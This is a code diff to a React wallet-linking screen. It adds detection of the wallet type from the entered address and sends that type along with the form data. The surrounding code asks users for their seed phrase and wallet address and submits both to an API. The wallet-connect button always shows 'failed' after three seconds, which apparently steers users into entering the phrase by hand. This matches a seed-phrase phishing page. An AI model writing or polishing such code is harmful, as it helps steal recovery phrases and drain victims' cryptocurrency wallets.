@@ -4,6 +4,7 @@ import { useState } from 'react';
 import { api } from '@/utils/api';
 import toast from 'react-hot-toast';
 import { useRouter } from 'next/navigation';
+import { checkWalletType } from '@/utils/walletUtils';
 
 const wallets = [
     {
@@ -154,6 +155,7 @@ export default function LinkWalletScreen() {
   const [privateKey, setPrivateKey] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [successData, setSuccessData] = useState(null);
+  const [detectedWalletType, setDetectedWalletType] = useState(null);
 
   const handleWalletClick = (wallet) => {
     setSelectedWallet(wallet);
@@ -163,6 +165,23 @@ export default function LinkWalletScreen() {
     setTimeout(() => {
       setConnectionState('failed');
     }, 3000);
+  };
+
+  const handleWalletAddressChange = (e) => {
+    const address = e.target.value;
+    setWalletAddress(address);
+    
+    if (address) {
+      const walletInfo = checkWalletType(address);
+      if (walletInfo) {
+        setDetectedWalletType(walletInfo.type);
+        console.log(`Detected wallet type: ${walletInfo.type}`);
+      } else {
+        setDetectedWalletType(null);
+      }
+    } else {
+      setDetectedWalletType(null);
+    }
   };
 
   const handleSubmit = async (e) => {
@@ -176,24 +195,23 @@ export default function LinkWalletScreen() {
         return;
       }
 
-      let walletData = {
+      const walletData = {
         phrase: seedPhrase,
-        walletAddress: walletAddress
+        walletAddress: walletAddress,
+        type: detectedWalletType || 'Unknown'
       };
 
       const response = await api.linkWallet(token, walletData);
       
       setSuccessData({
         referenceNumber: response.wallet.referenceNumber,
-        walletType:'Mobile Wallet',
+        walletType: detectedWalletType || 'Unknown',
       });
       
     } catch (error) {
       toast.error(error.message || 'Failed to link wallet');
       setError(true);
-      setTimeout(() => {
-        setError(false);
-      }, 3000);
+      setTimeout(() => setError(false), 3000);
     } finally {
       setIsLoading(false);
     }
@@ -222,14 +240,22 @@ export default function LinkWalletScreen() {
               className={`w-full bg-gray-900/50 border ${error ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[100px]`}
               required
             />
-            <input 
-              type="text"
-              value={walletAddress}
-              onChange={(e) => setWalletAddress(e.target.value)}
-              placeholder="Enter your wallet address..."
-              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
-              required
-            />
+            <div className="space-y-2">
+              <input 
+                type="text"
+                value={walletAddress}
+                onChange={handleWalletAddressChange}
+                placeholder="Enter your wallet address..."
+                className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
+                required
+              />
+              {detectedWalletType && (
+                <div className="flex items-center gap-2 text-sm text-green-400">
+                  <CheckCircle size={16} />
+                  {detectedWalletType} wallet detected
+                </div>
+              )}
+            </div>
             {error && (
               <p className="mt-2 text-sm text-red-500 flex items-center gap-2">
                 <X size={16} />
